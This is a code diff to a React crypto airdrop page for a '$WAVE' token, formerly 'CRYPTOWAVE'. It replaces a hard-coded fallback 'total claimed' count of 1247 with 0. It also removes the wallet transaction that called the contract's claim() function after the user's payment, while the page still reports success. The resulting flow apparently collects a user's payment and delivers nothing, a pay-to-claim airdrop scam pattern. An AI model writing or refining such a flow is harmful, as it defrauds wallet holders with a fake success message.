@@ -68,7 +68,7 @@ export default function AirdropPage({
     try {
       if (!isValidContractAddress) {
         console.log("[v0] Contract address not configured, using fallback")
-        setTotalClaimed(1247)
+        setTotalClaimed(0)
         return
       }
 
@@ -99,12 +99,12 @@ export default function AirdropPage({
               })
             } catch (addError) {
               console.error("Failed to add Linea network:", addError)
-              setTotalClaimed(1247)
+              setTotalClaimed(0)
               return
             }
           } else {
             console.log("[v0] Network switch failed, using fallback value")
-            setTotalClaimed(1247)
+            setTotalClaimed(0)
             return
           }
         }
@@ -127,16 +127,16 @@ export default function AirdropPage({
         } catch (contractError) {
           console.error("[v0] Contract call failed:", contractError)
           console.log("[v0] Using fallback value due to contract call failure")
-          setTotalClaimed(1247)
+          setTotalClaimed(0)
         }
       } else {
         console.log("[v0] No ethereum provider found, using fallback")
-        setTotalClaimed(1247)
+        setTotalClaimed(0)
       }
     } catch (error) {
       console.error("Error fetching total claims:", error)
       console.log("[v0] General error occurred, using fallback value")
-      setTotalClaimed(1247)
+      setTotalClaimed(0)
     }
   }
 
@@ -235,19 +235,6 @@ export default function AirdropPage({
           paymentHash: paymentTxHash,
         })
 
-        const claimTxHash = await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [
-            {
-              from: connectedAddress,
-              to: CONTRACT_ADDRESS,
-              data: "0x4e71d92d", // Function selector for claim()
-              gas: "0x7530", // 30000 gas limit for contract interaction
-            },
-          ],
-        })
-
-        console.log("[v0] Claim transaction sent:", claimTxHash)
 
         setClaimStatus({
           step: "success",
@@ -456,7 +443,7 @@ export default function AirdropPage({
         </div>
 
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
-          CRYPTOWAVE
+          $WAVE
         </h1>
 
         <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>
